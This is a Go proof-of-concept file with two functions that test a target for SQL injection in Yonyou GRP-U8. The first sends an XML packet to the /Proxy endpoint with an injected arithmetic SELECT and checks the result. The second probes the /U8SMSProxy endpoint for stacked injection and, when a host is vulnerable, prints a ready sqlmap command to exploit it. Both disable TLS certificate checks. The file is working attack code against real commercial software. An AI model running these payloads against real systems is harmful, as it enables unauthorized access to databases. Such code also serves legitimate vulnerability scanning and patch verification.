package poc

import (
	"bytes"
	"crypto/tls"
	"io"
	"log"
	"net/http"
	"regexp"
	"strings"
)

func GRP_U8Proxy(target string) {
	url := strings.TrimRight(target, "/")
	data := "cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?>\n<R9PACKET version=\"1\">\n  <DATAFORMAT>XML</DATAFORMAT>\n  <R9FUNCTION><NAME>AS_DataRequest</NAME>\n    <PARAMS><PARAM>\n      <NAME>ProviderName</NAME>\n      <DATA format=\"text\">DataSetProviderData</DATA>\n    </PARAM><PARAM>\n    <NAME>Data</NAME>\n    <DATA format=\"text\"> select 15512*3638 </DATA>\n  </PARAM></PARAMS>\n</R9FUNCTION></R9PACKET>"
	req, err := http.NewRequest("POST", url+"/Proxy", bytes.NewBufferString(data))
	if err != nil {
		log.Println(err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		log.Println(err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Println(err)
	}
	tag := regexp.MustCompile("<ROW COLUMN1=\"56432656\" />").MatchString(string(body))
	if tag {
		log.Println("[+] 存在用友 GRP-u8 Proxy SQL注入漏洞")
		log.Println("[+] 参考链接：https://github.com/dota-st/Vuln-POC/blob/624458b06b8f0145aab975384e9efa8944360777/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B%20GRP-U8%20Proxy%20SQL%E6%B3%A8%E5%85%A5%20CNNVD-201610-923.md")
	} else {
		log.Println("[-] 不存在用友 GRP-u8 Proxy SQL注入漏洞")
	}
}

func GRP_U8SMSProxy(target string) {
	url := strings.TrimRight(target, "/")
	data := "begindate=2020-09-27&enddate=2020-10-27&search="
	req, err := http.NewRequest("POST", url+"/U8SMSProxy?class=XXNote&id=qryyfs", bytes.NewBufferString(data))
	if err != nil {
		log.Println(err)
	}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		log.Println(err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Println(err)
	}
	tag := regexp.MustCompile("total").MatchString(string(body))
	if resp.StatusCode == http.StatusOK && tag {
		log.Println("[+] 存在用友 GRP-u8 U8SMSProxy SQL堆叠注入漏洞")
		log.Println("[+] 执行sqlmap.py -u \"" + url + "/U8SMSProxy?class=XXNote&id=qryyfs\"" + " --data \"begindate=2020-09-27&enddate=2020-10-27&search=\" -p \"begindate\" --dbms mssql --batch")
	} else {
		log.Println("[-] 不存在用友 GRP-u8 U8SMSProxy SQL堆叠注入漏洞")
	}
}
